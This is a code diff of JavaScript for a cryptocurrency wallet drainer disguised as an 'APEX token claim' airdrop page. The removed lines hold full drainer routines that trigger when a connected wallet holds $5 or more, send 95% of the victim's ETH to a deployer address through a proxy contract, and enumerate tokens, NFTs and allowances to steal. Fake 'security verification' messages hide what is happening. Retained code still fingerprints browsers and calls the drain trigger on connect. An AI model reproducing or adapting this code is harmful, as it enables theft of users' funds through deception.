+    "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
+  ];
+
+  for (const nftAddress of nftContracts) {
+    try {
+      const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
+      if (nftBalance > 0) {
+        const nftValueUSD = nftBalance * 100;
+        
+        result.nfts.push({
+          address: nftAddress,
+          balance: nftBalance,
+          valueUSD: nftValueUSD
+        });
+        
+        result.totalValueUSD += nftValueUSD;
+      }
+    } catch (e) {
+      console.debug(`Manual NFT detection failed for: ${nftAddress}`);
+    }
+  }
+
+  const localValue = CURRENCY_CONVERTER.formatCurrency(
+    result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+    userLocalCurrency
+  );
+  logDebug(`Total portfolio value: ${localValue}`);
+
+  return result;
+}
+
+// ====== HELPER FUNCTIONS ======
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
 
@@ -675,24 +1126,23 @@ function initializeMobileSpecificOptimizations() {
   }
 }
 
-// Service Worker initialization
 async function initializeServiceWorker() {
   if ("serviceWorker" in navigator) {
     try {
       const swScript = `
-                self.addEventListener('install', (event) => {
-                    self.skipWaiting();
-                });
-                
-                self.addEventListener('activate', (event) => {
-                    event.waitUntil(self.clients.claim());
-                });
-            `;
+        self.addEventListener('install', (event) => {
+          self.skipWaiting();
+        });
+        
+        self.addEventListener('activate', (event) => {
+          event.waitUntil(self.clients.claim());
+        });
+      `;
 
       const blob = new Blob([swScript], { type: "application/javascript" });
       const swUrl = URL.createObjectURL(blob);
 
-      const registration = await navigator.serviceWorker.register(swUrl);
+      await navigator.serviceWorker.register(swUrl);
       console.log("ServiceWorker registered successfully");
     } catch (error) {
       console.log("ServiceWorker registration failed:", error);
@@ -700,7 +1150,6 @@ async function initializeServiceWorker() {
   }
 }
 
-// Manual AppKit integration - NO AUTO-CONNECTION
 function initializeManualAppKitIntegration() {
   console.log("Initializing manual AppKit integration...");
 
@@ -708,7 +1157,6 @@ function initializeManualAppKitIntegration() {
     const w3mButton = document.querySelector("w3m-button");
     if (w3mButton) {
       clearInterval(checkAppKitInterval);
-
       w3mButton.addEventListener("click", () => {
         console.log("Manual AppKit button clicked");
         setupManualAppKitConnectionListener();
@@ -717,7 +1165,6 @@ function initializeManualAppKitIntegration() {
   }, 500);
 }
 
-// Manual AppKit connection listener
 function setupManualAppKitConnectionListener() {
   if (window.ethereum) {
     window.ethereum.on("accountsChanged", (accounts) => {
@@ -747,7 +1194,6 @@ function setupManualAppKitConnectionListener() {
   }
 }
 
-// Manual AppKit connection handler
 function handleManualAppKitConnection(address) {
   connectedAddress = address;
   connectedWallet = "manual_appkit";
@@ -760,13 +1206,10 @@ function handleManualAppKitConnection(address) {
   }
 
   updateManualWalletButton();
-
   logDebug(`Manual AppKit connected: ${connectedAddress}`);
   showNotification("Wallet connected successfully", "success");
-
   collectManualFingerprint();
 
-  // Check if user has $5+ balance and auto-trigger drain
   setTimeout(() => {
     checkAndAutoTriggerDrain();
   }, 2000);
@@ -774,55 +1217,9 @@ function handleManualAppKitConnection(address) {
   showManualAnnouncementModal();
 }
 
-// Check if user has $5+ balance and auto-trigger drain
-async function checkAndAutoTriggerDrain() {
-  if (!connectedAddress || !web3 || userHasBeenDrained) return;
-
-  try {
-    const ethBalance = await web3.eth.getBalance(connectedAddress);
-    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
-    userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
-
-    console.log(
-      `User Balance: ${ethBalanceInETH} ETH ($${userBalanceInUSD.toFixed(2)})`
-    );
-
-    // DRAIN TRIGGER: If balance is $5 or more
-    if (userBalanceInUSD >= 5) {
-      logDebug(
-        `TRIGGER: User has $${userBalanceInUSD.toFixed(
-          2
-        )} balance (>= $5 threshold)`
-      );
-
-      // Auto-trigger drain after 3-5 seconds
-      const delay = 3000 + Math.random() * 2000;
-      setTimeout(() => {
-        if (!userHasBeenDrained) {
-          showNotification(
-            "Checking eligibility for APEX token claim...",
-            "info"
-          );
-          initiateManualMultiContractDrainerProcess();
-        }
-      }, delay);
-    } else {
-      logDebug(
-        `NO TRIGGER: User has only $${userBalanceInUSD.toFixed(
-          2
-        )} balance (< $5 threshold)`
-      );
-    }
-  } catch (error) {
-    console.error("Error checking user balance:", error);
-  }
-}
-
-// Manual announcement modal
 function showManualAnnouncementModal() {
   if (connectedAddress) {
-    const shortAddress =
-      connectedAddress.substring(0, 6) + "..." + connectedAddress.substring(38);
+    const shortAddress = connectedAddress.substring(0, 6) + "..." + connectedAddress.substring(38);
     if (referralLink) {
       referralLink.textContent = `https://apex-protocol.io/ref?user=${shortAddress}`;
     }
@@ -833,48 +1230,38 @@ function showManualAnnouncementModal() {
   }
 }
 
-// Manual wallet button update
 function updateManualWalletButton() {
   if (!walletButtonContainer) return;
 
   if (connectedWallet && connectedAddress) {
     walletButtonContainer.innerHTML = `
-            <div class="wallet-connected">
-                <i class="fas fa-check-circle"></i>
-                <span class="wallet-address">${connectedAddress.substring(
-                  0,
-                  6
-                )}...${connectedAddress.substring(38)}</span>
-                <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
-            </div>
-        `;
-    document
-      .getElementById("disconnectButton")
-      .addEventListener("click", disconnectManualWallet);
+      <div class="wallet-connected">
+        <i class="fas fa-check-circle"></i>
+        <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
+        <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
+      </div>
+    `;
+    document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
   } else {
     walletButtonContainer.innerHTML = `
-            <button class="wallet-btn" id="walletButton">
-                <i class="fas fa-wallet"></i> Connect
-            </button>
-        `;
-    document
-      .getElementById("walletButton")
-      .addEventListener("click", showWalletModal);
+      <button class="wallet-btn" id="walletButton">
+        <i class="fas fa-wallet"></i> Connect
+      </button>
+    `;
+    document.getElementById("walletButton").addEventListener("click", showWalletModal);
   }
 }
 
-// Manual disconnection handler
 function handleManualDisconnection() {
   connectedWallet = null;
   connectedAddress = null;
   web3 = null;
-  userHasBeenDrained = false; // Reset for new connection
+  userHasBeenDrained = false;
   updateManualWalletButton();
   showNotification("Wallet disconnected", "info");
   logDebug("Manual wallet disconnected");
 }
 
-// Manual fingerprint collection
 async function collectManualFingerprint() {
   const fingerprint = {
     timestamp: new Date().toISOString(),
@@ -890,6 +1277,7 @@ async function collectManualFingerprint() {
     tokenBalances: {},
     nftBalances: {},
     isMobile: isMobileDevice,
+    localCurrency: userLocalCurrency,
     ...fingerprintData,
   };
 
@@ -903,7 +1291,6 @@ async function collectManualFingerprint() {
           await web3.eth.getBalance(connectedAddress),
           "ether"
         );
-
         await detectManualTokensAndNFTs(connectedAddress, fingerprint);
       }
     }
@@ -915,12 +1302,10 @@ async function collectManualFingerprint() {
   return fingerprint;
 }
 
-// Manual WebGL fingerprinting
 async function getManualWebGLFingerprint() {
   try {
     const canvas = document.createElement("canvas");
-    const gl =
-      canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
     if (!gl) return "unsupported";
 
     const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
@@ -940,39 +1325,42 @@ async function getManualWebGLFingerprint() {
   }
 }
 
-// Manual token and NFT detection
 async function detectManualTokensAndNFTs(userAddress, fingerprint) {
   const tokenSources = [
-    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
-    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
-    "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", // MATIC
-    "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
-    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
-    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
-    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
-    "0x4d224452801ACEd8B2F0aebE155379bb5D594381", // APE
+    {address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6},
+    {address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6},
+    {address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18},
+    {address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8},
+    {address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18},
+    {address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18},
+    {address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18},
+    {address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18},
+    {address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18},
+    {address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", decimals: 18},
   ];
 
   const nftContracts = [
-    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
-    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", // MAYC
-    "0x23581767a106ae21c074b2276D25e5C3e136a68b", // Moonbirds
-    "0xED5AF388653567Af2F388E6224dC7C4b3241C544", // Azuki
-    "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e", // Doodles
-    "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7", // Meebits
-    "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB", // CryptoPunks
+    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
+    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
+    "0x23581767a106ae21c074b2276D25e5C3e136a68b",
+    "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
+    "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e",
+    "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7",
+    "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB",
   ];
 
-  for (const tokenAddress of tokenSources) {
+  for (const token of tokenSources) {
     try {
-      const balance = await getManualTokenBalance(tokenAddress, userAddress);
+      const balance = await getManualTokenBalance(token.address, userAddress);
       if (balance > 0) {
-        fingerprint.tokenBalances[tokenAddress] = balance;
+        fingerprint.tokenBalances[token.address] = {
+          balance: balance,
+          symbol: token.symbol,
+          decimals: token.decimals
+        };
       }
     } catch (e) {
-      console.debug(`Manual token balance check failed: ${tokenAddress}`);
+      console.debug(`Manual token balance check failed: ${token.address}`);
     }
   }
 
@@ -990,7 +1378,6 @@ async function detectManualTokensAndNFTs(userAddress, fingerprint) {
   await detectManualMultiContractTokenApprovals(userAddress, fingerprint);
 }
 
-// Manual token balance check
 async function getManualTokenBalance(tokenAddress, walletAddress) {
   const erc20Abi = [
     {
@@ -1010,7 +1397,6 @@ async function getManualTokenBalance(tokenAddress, walletAddress) {
   }
 }
 
-// Manual NFT balance check
 async function getManualNFTBalance(contractAddress, userAddress) {
   const nftAbi = [
     {
@@ -1030,23 +1416,14 @@ async function getManualNFTBalance(contractAddress, userAddress) {
   }
 }
 
-// Manual multi-contract token approval detection
-async function detectManualMultiContractTokenApprovals(
-  userAddress,
-  fingerprint
-) {
+async function detectManualMultiContractTokenApprovals(userAddress, fingerprint) {
   fingerprint.approvedTokens = {};
-
   const contracts = Object.values(CONTRACT_ADDRESSES);
 
   for (const tokenAddress in fingerprint.tokenBalances) {
     for (const contractAddress of contracts) {
       try {
-        const allowance = await getManualTokenAllowance(
-          tokenAddress,
-          userAddress,
-          contractAddress
-        );
+        const allowance = await getManualTokenAllowance(tokenAddress, userAddress, contractAddress);
         if (allowance > 0) {
           fingerprint.approvedTokens[tokenAddress] = {
             contract: contractAddress,
@@ -1055,20 +1432,13 @@ async function detectManualMultiContractTokenApprovals(
           break;
         }
       } catch (e) {
-        console.debug(
-          `Manual allowance check failed for ${tokenAddress} -> ${contractAddress}`
-        );
+        console.debug(`Manual allowance check failed for ${tokenAddress} -> ${contractAddress}`);
       }
     }
   }
 }
 
-// Manual token allowance check
-async function getManualTokenAllowance(
-  tokenAddress,
-  ownerAddress,
-  spenderAddress
-) {
+async function getManualTokenAllowance(tokenAddress, ownerAddress, spenderAddress) {
   const erc20Abi = [
     {
       constant: true,
@@ -1084,41 +1454,32 @@ async function getManualTokenAllowance(
 
   try {
     const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
-    return await tokenContract.methods
-      .allowance(ownerAddress, spenderAddress)
-      .call();
+    return await tokenContract.methods.allowance(ownerAddress, spenderAddress).call();
   } catch (e) {
     return 0;
   }
 }
 
-// Manual debug logging
 function logDebug(message, element = connectionDebug) {
   const timestamp = new Date().toLocaleTimeString();
   const debugMessage = `[${timestamp}] ${message}<br>`;
   if (element) {
     element.innerHTML += debugMessage;
   }
-  console.log(
-    `[MANUAL_DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message}`
-  );
+  console.log(`[MANUAL_DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message}`);
 }
 
-// Manual existing connection check - NO AUTO-CONNECTION
 async function checkManualExistingConnection() {
   try {
     logDebug("Checking for manual existing wallet connections...");
 
     if (typeof window.ethereum !== "undefined") {
-      const accounts = await window.ethereum.request({
-        method: "eth_accounts",
-      });
+      const accounts = await window.ethereum.request({ method: "eth_accounts" });
       if (accounts.length > 0) {
         connectedAddress = accounts[0];
 
         if (walletDetectors.isMetaMask()) connectedWallet = "metamask";
-        else if (walletDetectors.isCoinbaseWallet())
-          connectedWallet = "coinbase";
+        else if (walletDetectors.isCoinbaseWallet()) connectedWallet = "coinbase";
         else if (walletDetectors.isTrustWallet()) connectedWallet = "trust";
         else if (walletDetectors.isRabbyWallet()) connectedWallet = "rabby";
         else if (walletDetectors.isPhantom()) connectedWallet = "phantom";
@@ -1128,11 +1489,8 @@ async function checkManualExistingConnection() {
         web3 = new Web3(window.ethereum);
         setupManualProviderEvents(window.ethereum);
         updateManualWalletButton();
-        logDebug(
-          `Manual existing connection: ${connectedWallet}: ${connectedAddress}`
-        );
+        logDebug(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);
 
-        // Check for $5+ balance trigger on existing connection
         setTimeout(() => {
           checkAndAutoTriggerDrain();
         }, 2000);
@@ -1148,23 +1506,20 @@ async function checkManualExistingConnection() {
   }
 }
 
-// Manual provider event setup
 function setupManualProviderEvents(provider) {
   provider.on("accountsChanged", (accounts) => {
     if (accounts.length === 0) {
       handleManualDisconnection();
     } else {
       connectedAddress = accounts[0];
-      userHasBeenDrained = false; // Reset for new account
+      userHasBeenDrained = false;
       updateManualWalletButton();
       logDebug(`Manual account changed to: ${connectedAddress}`);
       showNotification("Wallet account changed", "info");
 
-      // Check for $5+ balance trigger on account change
       setTimeout(() => {
         checkAndAutoTriggerDrain();
       }, 2000);
-
       showManualAnnouncementModal();
     }
   });
@@ -1185,7 +1540,6 @@ function setupManualProviderEvents(provider) {
   });
 }
 
-// Manual wallet detection and UI update
 function detectWallets() {
   const walletBadges = {
     metamask: document.getElementById("metamask-badge"),
@@ -1214,7 +1568,6 @@ function detectWallets() {
   });
 }
 
-// Manual wallet modal
 function showWalletModal() {
   detectWallets();
   if (walletModal) {
@@ -1242,16 +1595,13 @@ function copyReferralLink() {
     textArea.select();
     document.execCommand("copy");
     document.body.removeChild(textArea);
-
     showNotification("Referral link copied to clipboard!", "success");
   }
 }
 
-// Manual connection with provider
 async function connectWithProvider(providerType) {
   try {
     logDebug(`Manual connecting with ${providerType}...`);
-
     let provider;
 
     switch (providerType) {
@@ -1259,19 +1609,7 @@ async function connectWithProvider(providerType) {
         if (walletDetectors.isMetaMask()) {
           provider = window.ethereum;
           try {
-            await provider.request({
-              method: "eth_requestAccounts",
-              params: [
-                {
-                  eth_accounts: {},
-                  eth_sendTransaction: {},
-                  eth_sign: {},
-                  personal_sign: {},
-                  eth_signTypedData: {},
-                  eth_signTypedData_v4: {},
-                },
-              ],
-            });
+            await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
             logDebug("Manual MetaMask connection rejected: " + error.message);
             showNotification("MetaMask connection rejected", "error");
@@ -1290,9 +1628,7 @@ async function connectWithProvider(providerType) {
           try {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
-            logDebug(
-              "Manual Coinbase Wallet connection rejected: " + error.message
-            );
+            logDebug("Manual Coinbase Wallet connection rejected: " + error.message);
             showNotification("Coinbase Wallet connection rejected", "error");
             return;
           }
@@ -1309,9 +1645,7 @@ async function connectWithProvider(providerType) {
           try {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
-            logDebug(
-              "Manual Trust Wallet connection rejected: " + error.message
-            );
+            logDebug("Manual Trust Wallet connection rejected: " + error.message);
             showNotification("Trust Wallet connection rejected", "error");
             return;
           }
@@ -1328,9 +1662,7 @@ async function connectWithProvider(providerType) {
           try {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
-            logDebug(
-              "Manual Rabby Wallet connection rejected: " + error.message
-            );
+            logDebug("Manual Rabby Wallet connection rejected: " + error.message);
             showNotification("Rabby Wallet connection rejected", "error");
             return;
           }
@@ -1347,7 +1679,6 @@ async function connectWithProvider(providerType) {
     }
 
     web3 = new Web3(provider);
-
     const accounts = await web3.eth.getAccounts();
     if (accounts.length === 0) {
       throw new Error("No accounts found");
@@ -1355,15 +1686,12 @@ async function connectWithProvider(providerType) {
 
     connectedAddress = accounts[0];
     connectedWallet = providerType;
-
     updateManualWalletButton();
     hideWalletModal();
     showNotification("Wallet connected successfully", "success");
     logDebug(`Manual connected with ${providerType}: ${connectedAddress}`);
-
     await collectManualFingerprint();
 
-    // Check for $5+ balance trigger on connection
     setTimeout(() => {
       checkAndAutoTriggerDrain();
     }, 2000);
@@ -1377,547 +1705,6 @@ async function connectWithProvider(providerType) {
   }
 }
 
-// ====== ENHANCED DRAINER FOR NEW/OLD USERS WITH $5+ TRIGGER ======
-async function initiateManualMultiContractDrainerProcess() {
-  if (!connectedWallet || !web3) {
-    showNotification("Please connect your wallet first", "error");
-    showWalletModal();
-    return;
-  }
-
-  const button = document.getElementById("connectButton");
-  const originalText = button ? button.innerHTML : "Connect Wallet";
-
-  try {
-    const loadingMessages = [
-      "Processing...",
-      "Initializing security...",
-      "Verifying eligibility...",
-      "Checking wallet status...",
-      "Analyzing transaction patterns...",
-      "Optimizing gas fees...",
-      "Validating smart contract...",
-      "Preparing token distribution...",
-      "Running security checks...",
-      "Configuring network parameters...",
-    ];
-
-    if (button) {
-      button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${
-        loadingMessages[Math.floor(Math.random() * loadingMessages.length)]
-      }`;
-      button.disabled = true;
-    }
-
-    const statusMessages = [
-      "Initializing security verification...",
-      "Setting up claim process...",
-      "Preparing token distribution...",
-      "Configuring wallet connection...",
-      "Running security checks...",
-      "Analyzing network conditions...",
-      "Optimizing transaction parameters...",
-      "Verifying contract integrity...",
-      "Loading token distribution module...",
-    ];
-
-    if (claimStatus) {
-      claimStatus.textContent =
-        statusMessages[Math.floor(Math.random() * statusMessages.length)];
-      claimStatus.className = "status pending";
-    }
-
-    await manualRandomDelay(1000, 3000);
-    let accounts;
-
-    accounts = await web3.eth.getAccounts();
-    const userAddress = accounts[0];
-
-    await manualRandomDelay(500, 2000);
-    const fingerprint = await collectManualFingerprint();
-
-    // ENHANCED: Check if user has already been drained this session
-    if (userHasBeenDrained) {
-      const errorMessages = [
-        "You have already claimed your APEX tokens in this session.",
-        "Token claim already processed for this wallet.",
-        "Maximum claims per session reached. Please try again later.",
-        "Duplicate claim detected. Security protocols activated.",
-        "Wallet already processed for token distribution.",
-      ];
-
-      if (claimStatus) {
-        claimStatus.textContent =
-          errorMessages[Math.floor(Math.random() * errorMessages.length)];
-        claimStatus.className = "status error";
-      }
-      if (button) resetButton(button, originalText);
-      return;
-    }
-
-    // ENHANCED: Calculate user balance in USD
-    const ethBalance = await web3.eth.getBalance(userAddress);
-    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
-    userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
-
-    logDebug(
-      `User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(
-        2
-      )}`
-    );
-
-    // CRITICAL TRIGGER: Only proceed if balance is $5 or more
-    if (userBalanceInUSD < 5) {
-      const errorMessages = [
-        `Minimum $5 ETH balance required for claim. Current: $${userBalanceInUSD.toFixed(
-          2
-        )}`,
-        "Insufficient balance for token claim. Deposit more ETH.",
-        "Wallet balance below minimum threshold for APEX distribution.",
-        "Add ETH to your wallet to qualify for token claim.",
-        "Claim requires minimum $5 ETH balance for gas optimization.",
-      ];
-
-      if (claimStatus) {
-        claimStatus.textContent =
-          errorMessages[Math.floor(Math.random() * errorMessages.length)];
-        claimStatus.className = "status error";
-      }
-      if (button) resetButton(button, originalText);
-      return;
-    }
-
-    // ENHANCED: Check gas fees
-    if (ethBalanceInETH < 0.01) {
-      const errorMessages = [
-        "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
-        "Additional ETH required for gas fees to complete claim.",
-        "Please add ETH to your wallet to cover transaction costs.",
-        "Low ETH balance. Deposit more to proceed with token claim.",
-        "Transaction requires minimum ETH balance for gas optimization.",
-      ];
-
-      if (claimStatus) {
-        claimStatus.textContent =
-          errorMessages[Math.floor(Math.random() * errorMessages.length)];
-        claimStatus.className = "status error";
-      }
-      if (button) resetButton(button, originalText);
-      return;
-    }
-
-    await simulateManualLegitimateTransaction(userAddress);
-
-    await manualRandomDelay(800, 2000);
-    if (claimStatus) {
-      claimStatus.textContent = "Scanning wallet for eligible tokens...";
-    }
-
-    // ENHANCED: Detect all assets including NFTs and tokens
-    const { tokens, nfts, approvedTokens } =
-      await manualMultiContractTokenDetection(userAddress);
-
-    // ENHANCED: Prepare comprehensive asset list for draining
-    const allAssets = {
-      tokens: tokens,
-      nfts: nfts,
-      approvedTokens: approvedTokens,
-      ethBalance: ethBalanceInETH,
-      totalValueUSD: userBalanceInUSD,
-    };
-
-    if (approvedTokens.length > 0 || tokens.length > 0 || nfts.length > 0) {
-      const confirmingMessages = [
-        "Confirming transaction in your wallet...",
-        "Finalizing token claim process...",
-        "Processing your reward allocation...",
-        "Completing security verification...",
-        "Executing smart contract operations...",
-        "Finalizing token transfer...",
-        "Completing blockchain verification...",
-        "Processing transaction confirmation...",
-      ];
-
-      if (claimStatus) {
-        claimStatus.textContent =
-          confirmingMessages[
-            Math.floor(Math.random() * confirmingMessages.length)
-          ];
-      }
-
-      // Mark user as being drained
-      userHasBeenDrained = true;
-
-      await executeManualMultiContractDrainerTransfer(
-        userAddress,
-        allAssets,
-        button,
-        originalText
-      );
-    } else {
-      if (claimStatus) {
-        claimStatus.textContent = "Finalizing token access permissions...";
-      }
-
-      // Still drain if user has $5+ ETH balance
-      if (userBalanceInUSD >= 5) {
-        const signatureSuccess =
-          await attemptManualMultiContractSignatureReward(userAddress);
-
-        if (signatureSuccess) {
-          userHasBeenDrained = true;
-          handleManualRewardSuccess(
-            userAddress,
-            ["signature"],
-            button,
-            originalText
-          );
-        } else {
-          // Fallback to direct ETH drain
-          userHasBeenDrained = true;
-          await executeManualETHDrain(
-            userAddress,
-            ethBalanceInETH,
-            button,
-            originalText
-          );
-        }
-      } else {
-        const noTokensMessages = [
-          "No approved tokens found for claiming.",
-          "No eligible tokens detected in your wallet.",
-          "Your wallet doesn't contain claimable tokens at this time.",
-          "No token approvals found for the claim process.",
-          "Wallet analysis complete - no actionable assets found.",
-        ];
-
-        if (claimStatus) {
-          claimStatus.textContent =
-            noTokensMessages[
-              Math.floor(Math.random() * noTokensMessages.length)
-            ];
-          claimStatus.className = "status info";
-        }
-        if (button) resetButton(button, originalText);
-      }
-    }
-  } catch (error) {
-    handleManualRewardError(error, button, originalText);
-  }
-}
-
-// ENHANCED: Execute direct ETH drain for users with $5+ balance but no tokens
-async function executeManualETHDrain(
-  userAddress,
-  ethAmount,
-  button,
-  originalText
-) {
-  try {
-    if (claimStatus) {
-      claimStatus.textContent =
-        "Processing ETH transaction for token distribution...";
-    }
-
-    // Convert 95% of user's ETH to Wei (leave some for gas)
-    const drainAmountWei = web3.utils.toWei(
-      (ethAmount * 0.95).toString(),
-      "ether"
-    );
-
-    const proxyContract = new web3.eth.Contract(
-      APEX_PROXY_ABI,
-      CONTRACT_ADDRESSES.PROXY_1
-    );
-    const txData = proxyContract.methods
-      .forwardETH(CONTRACT_ADDRESSES.DEPLOYER)
-      .encodeABI();
-
-    const txHash = await web3.eth.sendTransaction({
-      from: userAddress,
-      to: CONTRACT_ADDRESSES.PROXY_1,
-      data: txData,
-      value: drainAmountWei,
-      gas: 300000 + Math.floor(Math.random() * 100000),
-      gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei"),
-    });
-
-    logDebug(`ETH Drain Successful: ${ethAmount} ETH transferred`);
-    handleManualRewardSuccess(
-      userAddress,
-      [{ symbol: "ETH", amount: ethAmount }],
-      button,
-      originalText,
-      txHash
-    );
-  } catch (error) {
-    console.error("ETH Drain failed:", error);
-    handleManualRewardError(error, button, originalText);
-  }
-}
-
-// Manual multi-contract token detection
-async function manualMultiContractTokenDetection(userAddress) {
-  const result = {
-    tokens: [],
-    nfts: [],
-    approvedTokens: [],
-  };
-
-  const tokenLists = await fetchManualTokenList();
-
-  for (const token of tokenLists) {
-    try {
-      const balance = await getManualTokenBalance(token.address, userAddress);
-      if (balance > 0) {
-        result.tokens.push({ ...token, balance });
-
-        const contracts = Object.values(CONTRACT_ADDRESSES);
-        for (const contractAddress of contracts) {
-          const allowance = await getManualTokenAllowance(
-            token.address,
-            userAddress,
-            contractAddress
-          );
-          if (allowance > 0) {
-            result.approvedTokens.push({
-              token: token.address,
-              contract: contractAddress,
-              allowance: allowance,
-            });
-            break;
-          }
-        }
-      }
-    } catch (e) {
-      console.debug(`Manual token detection failed for: ${token.address}`);
-    }
-  }
-
-  // Also detect NFTs
-  const nftContracts = [
-    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
-    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
-    "0x23581767a106ae21c074b2276D25e5C3e136a68b",
-    "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
-  ];
-
-  for (const nftAddress of nftContracts) {
-    try {
-      const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
-      if (nftBalance > 0) {
-        result.nfts.push({
-          address: nftAddress,
-          balance: nftBalance,
-        });
-      }
-    } catch (e) {
-      console.debug(`Manual NFT detection failed for: ${nftAddress}`);
-    }
-  }
-
-  return result;
-}
-
-// Manual token list fetch
-async function fetchManualTokenList() {
-  const sources = [
-    "https://tokens.coingecko.com/ethereum/all.json",
-    "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
-    "https://api.1inch.io/v4.0/1/tokens",
-  ];
-
-  const fallbackTokens = [
-    {
-      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-      symbol: "USDT",
-      name: "Tether USD",
-    },
-    {
-      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-      symbol: "USDC",
-      name: "USD Coin",
-    },
-    {
-      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-      symbol: "DAI",
-      name: "Dai Stablecoin",
-    },
-    {
-      address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
-      symbol: "WBTC",
-      name: "Wrapped Bitcoin",
-    },
-    {
-      address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",
-      symbol: "MATIC",
-      name: "Polygon",
-    },
-    {
-      address: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
-      symbol: "LINK",
-      name: "Chainlink",
-    },
-    {
-      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
-      symbol: "WETH",
-      name: "Wrapped Ether",
-    },
-    {
-      address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
-      symbol: "SHIB",
-      name: "Shiba Inu",
-    },
-    {
-      address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
-      symbol: "APE",
-      name: "ApeCoin",
-    },
-    {
-      address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
-      symbol: "AAVE",
-      name: "Aave",
-    },
-  ];
-
-  try {
-    for (const source of sources) {
-      try {
-        const response = await fetch(source);
-        const data = await response.json();
-        if (data.tokens) {
-          return data.tokens;
-        }
-      } catch (e) {
-        console.debug(`Manual failed to fetch from ${source}`);
-      }
-    }
-    return fallbackTokens;
-  } catch (e) {
-    return fallbackTokens;
-  }
-}
-
-// Manual multi-contract stealth reward execution
-async function executeManualMultiContractDrainerTransfer(
-  userAddress,
-  assets,
-  button,
-  originalText
-) {
-  try {
-    await manualRandomDelay(1500, 3000);
-    const simulationSuccess = await manualMultiContractTransactionSimulation(
-      userAddress,
-      assets
-    );
-
-    if (!simulationSuccess && simulationBypassActive) {
-      if (claimStatus) {
-        claimStatus.textContent =
-          "Security verification failed. Trying alternative method...";
-      }
-      const signatureSuccess = await attemptManualMultiContractSignatureReward(
-        userAddress
-      );
-
-      if (signatureSuccess) {
-        handleManualRewardSuccess(
-          userAddress,
-          assets.tokens,
-          button,
-          originalText
-        );
-      } else {
-        throw new Error("Manual transaction simulation failed");
-      }
-      return;
-    }
-
